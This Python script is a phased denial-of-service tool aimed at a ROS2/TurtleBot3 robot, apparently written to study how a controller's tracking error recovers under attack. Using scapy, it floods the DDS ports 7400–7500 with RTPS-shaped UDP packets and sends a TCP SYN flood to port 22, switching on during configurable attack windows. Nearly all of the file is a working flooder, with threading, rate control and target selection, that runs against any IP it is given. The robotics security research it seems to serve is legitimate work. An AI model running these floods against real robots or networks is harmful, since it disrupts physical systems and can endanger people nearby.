#!/usr/bin/env python3
"""
ROS2/TurtleBot3 Phased DoS Simulation
=======================================
Runs a scheduled flood attack with configurable attack/recovery windows,
designed to run in parallel with the figure-8 controller experiment.

Default schedule (600s experiment):
  [  0 – 100s]  Baseline   — no attack, robot running normally
  [100 – 200s]  Attack #1  — flood active
  [200 – 300s]  Recovery   — attack off, observe tracking error recovery
  [300 – 400s]  Attack #2  — flood active again
  [400 – 600s]  Recovery   — attack off until experiment ends

Usage:
  sudo python3 ros2_flood.py --target 192.168.50.48
  
Requirements:
  pip install scapy
  Run as root (needs raw socket access for scapy).

Deployment options:
  External (laptop on same WiFi): simulates external network attacker
  Internal (kubectl exec into a pod): simulates compromised cluster agent
"""

import argparse
import logging
import random
import signal
import sys
import time
from threading import Event, Thread

try:
    from scapy.all import IP, UDP, TCP, Raw, send, RandShort, conf
except ImportError:
    print("ERROR: scapy not found. Install with:  pip install scapy")
    sys.exit(1)

conf.verb = 0

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("attack_log.txt"),
    ],
)
log = logging.getLogger(__name__)

# ROS2 DDS port range for ROS_DOMAIN_ID=0.
# DDS allocates ports dynamically across this range based on participant count,
# endpoint count, and CycloneDDS internal assignments — scanning the full
# range covers discovery, data, and service ports even as the node count grows.
ROS2_DDS_PORTS = list(range(7400, 7501))  # 7400–7500 inclusive

DDS_MULTICAST_GROUP = "239.255.0.1"

# Shared state
stats = {
    "sent_total": 0,
    "sent_this_window": 0,
    "errors": 0,
    "phase": "INIT",
    "attack_windows": 0,
}
stop_event = Event()      # terminates all threads
attack_active = Event()   # gates packet sending (set = attack on)


def signal_handler(sig, frame):
    log.info("Interrupt — shutting down.")
    stop_event.set()
    attack_active.clear()


def build_rtps_payload() -> bytes:
    """Minimal RTPS-shaped payload to stress DDS parsing on the robot."""
    header = b"RTPS\x02\x01\x01\x0f" + bytes(12)   # magic + version + vendor + GUID prefix
    submsg = b"\x09\x01\x08\x00" + bytes(8)          # INFO_TS
    submsg += b"\x15\x05" + b"\x00" * 512             # DATA + padding
    return header + submsg


def udp_worker(target_ip: str, port: int, rate: int, payload_size: int):
    """Flood a single UDP port. Pauses automatically during recovery windows."""
    rtps = build_rtps_payload()
    generic = bytes(random.getrandbits(8) for _ in range(payload_size))
    payload = rtps if port in ROS2_DDS_PORTS else generic
    interval = 1.0 / rate if rate > 0 else 0

    while not stop_event.is_set():
        if not attack_active.is_set():
            attack_active.wait(timeout=0.5)   # sleep until next attack window
            continue
        try:
            pkt = IP(dst=target_ip) / UDP(sport=RandShort(), dport=port) / Raw(load=payload)
            send(pkt, verbose=False)
            stats["sent_total"] += 1
            stats["sent_this_window"] += 1
        except Exception:
            stats["errors"] += 1
        if interval > 0:
            time.sleep(interval)


def tcp_syn_worker(target_ip: str, port: int, rate: int):
    """TCP SYN flood — exhausts connection state on target. Pauses during recovery."""
    interval = 1.0 / rate if rate > 0 else 0
    while not stop_event.is_set():
        if not attack_active.is_set():
            attack_active.wait(timeout=0.5)
            continue
        try:
            pkt = IP(dst=target_ip) / TCP(
                sport=RandShort(), dport=port,
                flags="S", seq=random.randint(0, 2**32 - 1)
            )
            send(pkt, verbose=False)
            stats["sent_total"] += 1
            stats["sent_this_window"] += 1
        except Exception:
            stats["errors"] += 1
        if interval > 0:
            time.sleep(interval)


def phase_scheduler(schedule: list[tuple[float, float]], experiment_duration: float):
    """
    Controls attack_active based on the attack schedule.
    schedule: list of (attack_start, attack_end) tuples in seconds from experiment start.
    Logs phase transitions clearly for cross-referencing with the controller CSV.
    """
    t_start = time.time()

    def elapsed():
        return time.time() - t_start

    # Build a flat event list: (time, action, label)
    events = []
    for i, (t_on, t_off) in enumerate(schedule):
        events.append((t_on, "ON", f"Attack window {i+1} start"))
        events.append((t_off, "OFF", f"Attack window {i+1} end (recovery)"))
    events.append((experiment_duration, "END", "Experiment duration reached"))
    events.sort(key=lambda x: x[0])

    log.info("Phase schedule (relative to script start):")
    for t_ev, action, label in events:
        log.info(f"  t={t_ev:6.1f}s  {action:3s}  {label}")

    stats["phase"] = "BASELINE"
    log.info(f"[t=0.0s] BASELINE — no attack, robot running normally")

    for t_ev, action, label in events:
        wait = t_ev - elapsed()
        if wait > 0:
            # Sleep in short intervals so we can respond to stop_event
            deadline = time.time() + wait
            while time.time() < deadline and not stop_event.is_set():
                time.sleep(min(0.2, deadline - time.time()))

        if stop_event.is_set():
            break

        t_now = elapsed()
        if action == "ON":
            stats["sent_this_window"] = 0
            stats["attack_windows"] += 1
            stats["phase"] = f"ATTACK #{stats['attack_windows']}"
            attack_active.set()
            log.info(f"[t={t_now:.1f}s] >>> ATTACK ON  — {label}")
        elif action == "OFF":
            attack_active.clear()
            stats["phase"] = "RECOVERY"
            log.info(f"[t={t_now:.1f}s] <<< ATTACK OFF — {label} | "
                     f"pkts this window: {stats['sent_this_window']:,}")
        elif action == "END":
            attack_active.clear()
            stop_event.set()
            log.info(f"[t={t_now:.1f}s] Experiment duration reached — stopping.")

    stop_event.set()
    attack_active.clear()


def stats_reporter():
    """Print throughput every 10 seconds."""
    t_start = time.time()
    while not stop_event.is_set():
        time.sleep(10)
        elapsed = time.time() - t_start
        active = "ACTIVE" if attack_active.is_set() else "PAUSED"
        pps = stats["sent_total"] / elapsed if elapsed > 0 else 0
        log.info(f"  [{stats['phase']} | flood {active}] "
                 f"total={stats['sent_total']:,}  errors={stats['errors']}  "
                 f"avg={pps:.0f} pkt/s  t={elapsed:.0f}s")


def parse_schedule(schedule_str: str) -> list[tuple[float, float]]:
    """
    Parse schedule string like '60:120,180:240' into [(60,120),(180,240)].
    """
    windows = []
    for part in schedule_str.split(","):
        part = part.strip()
        if not part:
            continue
        on_str, off_str = part.split(":")
        windows.append((float(on_str), float(off_str)))
    return windows


def run(args):
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    schedule = parse_schedule(args.schedule)

    log.info("=" * 60)
    log.info("ROS2 TurtleBot3 Phased DoS Simulation")
    log.info(f"  Target          : {args.target}")
    log.info(f"  Mode            : {args.mode}")
    log.info(f"  Rate            : {args.rate} pkt/s per thread")
    log.info(f"  Threads/port    : {args.threads}")
    log.info(f"  Experiment      : {args.experiment_duration}s")
    log.info(f"  Attack windows  : {schedule}")
    log.info("=" * 60)
    log.warning("FOR AUTHORIZED RESEARCH USE ONLY.")

    threads = []

    # --- Flood threads (start paused — attack_active not set yet) ---
    if args.mode in ("udp_dds", "all"):
        for port in ROS2_DDS_PORTS:
            for _ in range(args.threads):
                t = Thread(target=udp_worker,
                           args=(args.target, port, args.rate, args.payload_size),
                           daemon=True)
                threads.append(t)

    if args.mode in ("tcp_ssh", "all"):
        for _ in range(args.threads):
            t = Thread(target=tcp_syn_worker,
                       args=(args.target, 22, args.rate),
                       daemon=True)
            threads.append(t)

    if args.mode == "custom":
        if args.port is None:
            log.error("--mode custom requires --port")
            sys.exit(1)
        for _ in range(args.threads):
            t = Thread(target=udp_worker,
                       args=(args.target, args.port, args.rate, args.payload_size),
                       daemon=True)
            threads.append(t)

    # Start all flood threads (they block on attack_active until scheduler fires)
    for t in threads:
        t.start()

    # Reporter
    reporter = Thread(target=stats_reporter, daemon=True)
    reporter.start()

    # Scheduler runs in main thread — controls timing precisely
    phase_scheduler(schedule, args.experiment_duration)

    # Wait for flood threads to notice stop_event
    for t in threads:
        t.join(timeout=2.0)

    elapsed = time.time()   # rough, since t_start is inside scheduler
    log.info("=" * 60)
    log.info("Simulation complete.")
    log.info(f"  Total packets sent : {stats['sent_total']:,}")
    log.info(f"  Total errors       : {stats['errors']}")
    log.info(f"  Attack windows run : {stats['attack_windows']}")
    log.info("Results appended to attack_log.txt")
    log.info("=" * 60)


def main():
    parser = argparse.ArgumentParser(
        description="Phased ROS2/TurtleBot3 DoS simulation"
    )
    parser.add_argument("--target", required=True,
                        help="Target robot IP address")
    parser.add_argument("--mode", choices=["udp_dds", "tcp_ssh", "all", "custom"],
                        default="udp_dds",
                        help="Attack mode (default: udp_dds)")
    parser.add_argument("--port", type=int, default=None,
                        help="Port for custom mode")
    parser.add_argument("--rate", type=int, default=500,
                        help="Packets per second per thread (default: 500)")
    parser.add_argument("--threads", type=int, default=2,
                        help="Threads per port (default: 2)")
    parser.add_argument("--experiment-duration", type=float, default=600.0,
                        help="Total experiment duration in seconds (default: 600)")
    parser.add_argument("--schedule", type=str, default="100:200,300:400",
                        help="Attack windows as 'start:end,...' in seconds "
                             "(default: '100:200,300:400' for 600s experiment)")
    parser.add_argument("--payload-size", type=int, default=512,
                        help="Payload bytes for generic UDP packets (default: 512)")

    args = parser.parse_args()
    run(args)


if __name__ == "__main__":
    main()
